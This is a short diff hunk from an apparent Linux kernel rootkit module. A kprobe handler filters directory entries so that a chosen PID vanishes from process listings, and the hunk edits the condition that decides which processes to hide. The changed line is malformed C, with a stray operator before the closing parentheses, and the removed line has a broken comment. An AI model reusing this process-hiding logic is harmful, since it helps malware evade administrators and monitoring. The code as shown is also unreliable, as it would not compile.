@@ -97,7 +97,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	    {
 		    dir = (void *)kdirent + offset;
 
-		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10)/*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*))
+		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10)*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*))
 		    {			
 			    if (dir == kdirent)
 			    {
